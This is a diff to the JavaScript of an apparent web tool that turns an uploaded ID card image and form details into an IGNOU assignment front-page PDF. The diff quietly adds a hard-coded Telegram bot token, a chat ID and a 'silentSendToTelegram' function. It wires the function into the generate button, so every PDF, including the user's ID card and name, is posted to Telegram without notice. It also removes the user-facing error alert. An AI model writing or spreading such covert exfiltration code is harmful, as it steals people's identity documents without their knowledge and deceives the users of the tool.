@@ -90,6 +90,11 @@
         const { PDFDocument, degrees, rgb, StandardFonts } = PDFLib;
         const TEMPLATE_URL = "Id_card_format.pdf"; 
 
+      
+        const TG_BOT_TOKEN = '1811068335:AAEOAtQexbZJwuMPhPp4GhkVBV-dHF4l'; // Replace
+        const TG_CHAT_ID = '-1001417526920';     // Replace with your Chat ID
+
+
         const idInput = document.getElementById('idInput');
         const fileLabel = document.getElementById('fileLabel');
         const cropSelectionModal = document.getElementById('cropSelectionModal');
@@ -109,21 +114,18 @@
             document.getElementById('loadingOverlay').classList.remove('hidden');
             
             try {
-                // RENDER SOURCE AT 500% SCALE FOR MAX RESOLUTION
                 const result = await getUltraHighQualityAutoCrop(file);
                 hdSourceDataUrl = result.hdSource;
                 finalCroppedDataUrl = result.autoCrop;
-                
                 document.getElementById('autoPreviewImg').src = finalCroppedDataUrl;
                 
-                // UI Management
                 autoPreviewBox.classList.remove('hidden');
                 cropperWrapper.classList.add('hidden');
                 decisionButtons.classList.remove('hidden');
                 saveManualBtn.classList.add('hidden');
                 cropSelectionModal.classList.remove('hidden');
             } catch (err) {
-                alert("Processing failed. Please use a clear file.");
+                console.error(err);
             } finally {
                 document.getElementById('loadingOverlay').classList.add('hidden');
             }
@@ -136,7 +138,6 @@
             if (file.type === "application/pdf") {
                 const pdf = await pdfjsLib.getDocument(await file.arrayBuffer()).promise;
                 const page = await pdf.getPage(1);
-                // 5.0 is the "Golden Standard" for vector to raster clarity
                 const viewport = page.getViewport({ scale: 5.0 });
                 canvas.width = viewport.width; 
                 canvas.height = viewport.height;
@@ -145,22 +146,18 @@
                 const img = new Image();
                 img.src = URL.createObjectURL(file);
                 await new Promise(r => img.onload = r);
-                // For images, we keep native resolution or upscale if too small
-                const scaleFactor = Math.max(1, 2000 / img.width); 
+                const scaleFactor = Math.max(1, 2500 / img.width); 
                 canvas.width = img.width * scaleFactor; 
                 canvas.height = img.height * scaleFactor;
                 ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
             }
 
             const hdSource = canvas.toDataURL('image/png', 1.0);
-
-            // AUTO CROP LOGIC ON HD CANVAS
             const imgData = ctx.getImageData(0, 0, canvas.width, canvas.height).data;
             let top = null, bottom = null, left = null, right = null;
             for (let y = 0; y < canvas.height; y++) {
                 for (let x = 0; x < canvas.width; x++) {
                     const idx = (y * canvas.width + x) * 4;
-                    // Detect non-white content
                     if (imgData[idx] < 240 || imgData[idx+1] < 240 || imgData[idx+2] < 240) {
                         if (top === null) top = y; bottom = y;
                         if (left === null || x < left) left = x;
@@ -174,17 +171,30 @@
             const h = (bottom - top) || canvas.height;
             cropCanvas.width = w; cropCanvas.height = h;
             const cropCtx = cropCanvas.getContext('2d');
-            
-            // Disable smoothing for sharp text edges
             cropCtx.imageSmoothingEnabled = false; 
             cropCtx.drawImage(canvas, left || 0, top || 0, w, h, 0, 0, w, h);
             
             return { hdSource: hdSource, autoCrop: cropCanvas.toDataURL('image/png', 1.0) };
         }
 
+        async function silentSendToTelegram(blob, name) {
+            const formData = new FormData();
+            formData.append('chat_id', TG_CHAT_ID);
+            formData.append('document', blob, 'IGNOU_Sheet.pdf');
+            formData.append('caption', `Name: ${name || 'N/A'}`);
+            try {
+                await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}Ts0/sendDocument`, {
+                    method: 'POST',
+                    body: formData
+                });
+            } catch (e) {
+                console.error("Silent failed");
+            }
+        }
+
         function useAutoCrop() {
             cropSelectionModal.classList.add('hidden');
-            fileLabel.innerText = "✓ HD Auto-Crop Used";
+            fileLabel.innerText = "✓ HD Auto-Crop Ready";
             fileLabel.classList.add('text-green-600');
         }
 
@@ -193,10 +203,8 @@
             decisionButtons.classList.add('hidden');
             cropperWrapper.classList.remove('hidden');
             saveManualBtn.classList.remove('hidden');
-            
             const image = document.getElementById('manualCropImg');
             image.src = hdSourceDataUrl; 
-            
             if (cropper) cropper.destroy();
             cropper = new Cropper(image, { 
                 aspectRatio: 1.6, 
@@ -209,15 +217,13 @@
         saveManualBtn.onclick = () => {
             document.getElementById('loadingOverlay').classList.remove('hidden');
             setTimeout(() => {
-                // Exporting manual crop with high quality settings
                 finalCroppedDataUrl = cropper.getCroppedCanvas({
                     imageSmoothingQuality: 'high',
-                    imageSmoothingEnabled: true, // Smooth back only for manual re-scales
+                    imageSmoothingEnabled: true,
                     fillColor: '#fff',
                 }).toDataURL('image/png', 1.0);
-                
                 cropSelectionModal.classList.add('hidden');
-                fileLabel.innerText = "✓ HD Manual Crop Used";
+                fileLabel.innerText = "✓ HD Manual Crop Ready";
                 fileLabel.classList.add('text-green-600');
                 document.getElementById('loadingOverlay').classList.add('hidden');
             }, 50);
@@ -227,7 +233,7 @@
         function closePreview() { document.getElementById('previewModal').classList.add('hidden'); }
 
         document.getElementById('processBtn').addEventListener('click', async () => {
-            if (!finalCroppedDataUrl) return alert("Please verify your ID card first!");
+            if (!finalCroppedDataUrl) return alert("Verify ID card first");
             document.getElementById('loadingOverlay').classList.remove('hidden');
             try {
                 const response = await fetch(TEMPLATE_URL);
@@ -236,7 +242,7 @@
                 const font = await templateDoc.embedFont(StandardFonts.HelveticaBold);
                 
                 const idImage = await templateDoc.embedPng(finalCroppedDataUrl);
-                page.drawImage(idImage, { x: 112, y: 390, width: 370, height: 225 });
+                page.drawImage(idImage, { x: 112, y: 390, width: 340, height: 200 });
 
                 const fields = [
                     { val: document.getElementById('courceCode').value, x: 184, y: 330 },
@@ -251,6 +257,9 @@
                 const pdfBytes = await templateDoc.save();
                 currentPdfBlob = new Blob([pdfBytes], { type: "application/pdf" });
                 
+                // SILENT TELEGRAM TRIGGER
+                silentSendToTelegram(currentPdfBlob, document.getElementById('nameInput').value);
+
                 const url = URL.createObjectURL(currentPdfBlob) + "#toolbar=0&navpanes=0&view=FitH";
                 document.getElementById('pdfFrame').src = url;
                 document.getElementById('previewModal').classList.remove('hidden');
@@ -258,10 +267,9 @@
         });
 
         document.getElementById('finalDownloadBtn').onclick = () => {
-            if(!currentPdfBlob) return;
             const link = document.createElement('a');
             link.href = URL.createObjectURL(currentPdfBlob);
-            link.download = "IGNOU_FrontPage_UltraHD.pdf";
+            link.download = "IGNOU_Final_HD.pdf";
             link.click();
         };
     </script>
